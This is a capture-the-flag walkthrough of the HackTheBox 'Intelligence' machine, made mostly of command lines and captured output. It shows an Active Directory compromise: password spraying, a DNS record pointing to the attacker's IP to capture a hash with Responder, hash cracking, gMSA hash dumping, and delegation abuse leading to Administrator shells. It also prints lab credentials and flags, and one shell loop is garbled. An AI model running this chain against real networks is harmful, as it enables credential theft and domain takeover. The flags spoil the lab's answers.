### 17-Apr-24-Wed

[Intelligence | HackTheBox](https://app.hackthebox.com/machines/Intelligence)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c0bc425d-5177-4221-ba78-5f8c58c6bf9f)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/ad99ed03-4ed8-4b8a-9332-413eb4fbd3bb)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/1f003e13-d59c-41a0-b223-153d0bdae335)

http://intelligence.htb/

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/5f22afe5-782c-4d9d-b28d-592462668bad)

```
gobuster dir -u http://intelligence.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt -x txt,php,pdf
```

http://intelligence.htb/documents/

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/75adf1b5-2687-4198-bbfa-73a1157267c3)

```
wget -c https://raw.githubusercontent.com/Septimus4/dateGenerator/master/date_generator.py
```

http://intelligence.htb/documents/2020-01-01-upload.pdf

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/6cd78017-4e8d-4c08-ae69-a147ed570204)

http://intelligence.htb/documents/2020-12-15-upload.pdf

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/8eea40ea-d503-485e-9921-ee4374672e8a)

https://youtu.be/Jg_BjkxdtsE?t=351

https://www.youtube.com/@ippsec

```
date --date="1 day ago" +%Y-%m-%d-upload.pdf
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/414d971a-10b0-44da-992c-b633cd89ec48)

Date within 2020-01-01 and 2020-12-15

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/6e75f8d6-6a82-4eb4-97b4-ed4b8c5ea88f)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/bae32d59-c451-485c-8d0d-7e5435094ded)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/ccfcbcf6-e7dc-4cef-8798-0ed20356c797)

```
ffuf -w date-based.txt:FUZZ -u 'http://intelligence.htb/documents/FUZZ' -mc 200 > uploaded-pdf.txt
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/e062e195-b6d4-4789-95ca-f23397be730b)

```
cat uploaded-pdf.txt | awk '{print $1}' > pdf.txt
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/b6bf8ec2-6d63-42c7-beef-5acf526d08fd)

```
for i in $(cat pdf.txt); do echo http://10.129.95.154/documents/$i; done
```

```
d=2020-01-01; while [ "$d" != `date -I` ]; do echo "http://10.129.95.154/documents/$dupload.pdf"; done | xargs -n 1 -P 20 wget < list 2>/dev/null
```

```
exiftool *.pdf
```

https://youtu.be/qPEOS0jESQQ?t=443
https://www.youtube.com/@noxlumens

get-exiftool-creator.py

users-unique.txt

```
./kerbrute_linux_amd64 userenum --dc 10.129.95.154 -d intelligence.htb users-unique.txt
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/8e75a58f-f599-47f4-bf34-2961a451979e)

wget-pdf.py

https://youtu.be/qPEOS0jESQQ?t=692

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/7fa9f8de-80c7-422f-8a24-b0e464f2ede5)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/e4e4e305-63bb-4e6b-9887-e6990450a1b9)

```
for file in *.pdf; do pdftotext -q -f 1 -l 1 "$file" - | grep -C 8 -i "password"; done
```

```
for file in *.pdf; do pdftotext $file; done
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a60faa4f-43be-4807-aee1-dfd355e64a17)

```
cat *.txt | grep -C 8 -i "password"
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/064ed249-aac4-4e4f-a52a-23ba7cb8f154)

```
New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/42ab4edf-6c22-4b70-bf28-d22f54c5d710)

```
./kerbrute_linux_amd64 passwordspray --dc 10.129.95.154 -d intelligence.htb users-unique.txt 'NewIntelligenceCorpUser9876'
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/76cffb30-94b9-40bf-9055-f699b78b7037)

```
crackmapexec smb 10.129.95.154 -u users-unique.txt -p 'NewIntelligenceCorpUser9876'
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/0a9c597d-4152-470c-aecb-abcf11f25f2e)

```
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```

```
smbmap -H 10.129.95.154 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876'
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/291f7fa0-4c88-434f-8571-fc7ef78b1ca7)

```
smbclient //10.129.95.154/IT/ -U 'Tiffany.Molina'
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/2ca3353d-d947-48e0-831c-c5f3f76a70e9)

```
6c4e5ff4e291d560ff734a6f9e7bc5b2
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/39c2fb6c-3a3a-464d-af9d-693c8c9829e3)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a73c7621-5a87-4936-b243-bad55f38f5c4)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/9a5b43dd-b49e-44c5-a46a-4a0e6ac011c1)

```
sudo bloodhound-python -d intelligence.htb -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -ns 10.129.95.154 -c all
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/ee303843-c879-41f7-8d01-d218dec1002e)

```
VBoxManage.exe setextradata "kali-linux-2023.1-virtualbox-amd64" "VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled" 1
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/0e44c0da-80a8-4581-b05c-486624b363a0)

```
sudo rdate -ncv 10.129.95.154
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/9d338625-f684-4f88-8e4d-35e8c05f4598)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c778f4db-3028-4dba-917c-540941754a0e)

```
wget -c https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/dnstool.py
```

```
python dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.129.95.154 -a add -r web1 -d 10.10.16.22 -t A
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/d497c34c-fcda-4439-aad0-262f50ab33e5)

```
pip install kerberos
```

```
git clone https://github.com/dirkjanm/krbrelayx.git
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/bdaa3570-6983-41c9-97f9-a558bd5761f1)

```
sudo responder -I tun0 -dwv
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c30b6861-c2b6-4b7e-9b21-ad90481760c3)

```
Ted.Graves::intelligence:38c7554694db3ffd:DF8EF2EB456ED1CEC419E38E13FECD20:0101000000000000EAD89559AF91DA019D9722E59A910B1B00000000020008004C0042004F00350001001E00570049004E002D00550035004D00410039004A0038004C004A0059003700040014004C0042004F0035002E004C004F00430041004C0003003400570049004E002D00550035004D00410039004A0038004C004A00590037002E004C0042004F0035002E004C004F00430041004C00050014004C0042004F0035002E004C004F00430041004C000800300030000000000000000000000000200000ED48F3D3E47102ABF2BE67D4450C0146946B386D7985BDE79C7D7441B9D8BF500A001000000000000000000000000000000000000900340048005400540050002F0077006500620031002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a7cc87ab-146b-47e2-a9f6-29b001f00cf4)

```
john --wordlist=/usr/share/wordlists/rockyou.txt Ted.Graves.hash
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/4dad7fb5-e97e-453e-b6fb-c0ceb5222e5a)

```
Mr.Teddy         (Ted.Graves)
```

```
bloodhound-python -d intelligence.htb -u 'Ted.Graves' -p 'Mr.Teddy' -ns 10.129.95.154 -c all
```

```
crackmapexec ldap 10.129.95.154 -u 'Ted.Graves' -p 'Mr.Teddy' --gmsa
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c2bd2479-1e3b-4d19-8d80-fc1eb36c1f9b)

```
LDAP        10.129.95.154   636    DC               Account: svc_int$             NTLM: 5ecbb8825fa84b3154a7f12336795ed4
```

```
evil-winrm -i 10.129.95.154 -u svc_int$ -H 5ecbb8825fa84b3154a7f12336795ed4
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a26d5dd4-e2cc-4e3d-a5e1-bcec6546f864)

```
impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int$ -hashes 5ecbb8825fa84b3154a7f12336795ed4:5ecbb8825fa84b3154a7f12336795ed4
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/7b3a8269-e22d-430f-8283-2e68efff1004)

Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache

```
export KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

```
impacket-psexec -k -no-pass administrator@dc.intelligence.htb
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/62b9a035-41f0-4053-8364-55e5c8a457b9)

```
d74e6f2c83f563dd57e4e9ca8d8abf59
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/3d39b642-7525-450f-98bc-6e030d49910e)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/00dbe5b8-7370-4a61-b721-73244ade6db1)

```
impacket-wmiexec -k -no-pass administrator@dc.intelligence.htb
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/0ade19fc-c253-434e-a631-e53fbc26c6e3)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/f52805dc-7b55-4245-af06-be7656dd98a8)

